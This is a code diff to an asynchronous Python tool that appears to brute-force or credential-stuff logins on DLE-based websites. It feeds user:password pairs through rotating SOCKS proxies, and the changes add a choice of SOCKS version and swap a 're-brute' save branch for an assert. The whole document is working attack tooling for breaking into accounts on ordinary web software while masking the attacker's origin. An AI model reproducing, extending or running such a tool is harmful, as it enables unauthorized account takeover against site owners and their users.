@@ -71,7 +71,7 @@ async def macros(p, u, s):
 
 async def proxy_request():
     async with ClientSession() as s:
-        async with s.get(proxy_url) as resp:
+        async with s.get(socks_url) as resp:
             return await (resp.text()).split('\n')
 
 
@@ -109,7 +109,7 @@ async def valid(status, text, url):
 async def DLE(link, user, passw, proxy):
     global finished, good
 
-    cproxy = SocksConnector.from_url('socks5://' + proxy)
+    cproxy = SocksConnector.from_url(f'socks{socks_type}://' + proxy)
 
     try:
         user = await macros(user, link, '')
@@ -118,10 +118,7 @@ async def DLE(link, user, passw, proxy):
         with silent_out():
             async with ClientSession(connector=cproxy) as s:
                 data = await first(s, link)
-
-                if not await valid(data[1], data[0], link):
-                    save('rebrut', f'{link} - {user}:{passw}')
-                    return
+                assert await valid(data[1], data[0], link) is True
 
                 _post = await parse(data[0], user, passw)
                 data = await second(s, link, _post)
@@ -184,9 +181,12 @@ async def main():
 if __name__ == "__main__":
     good = 0
     finished = 0
+
     threads = int(input('Threads: '))
     timeout = int(input('Timeout: '))
-    proxy_url = input('SOCKS4 Link: ')
+
+    socks_type = input('SOCKS Ver.: ')
+    socks_url = input(f'SOCKS{socks_type} Link: ')
     rotate = bool(int(input('Rotate proxy: ')))
 
     asyncio.run(main())
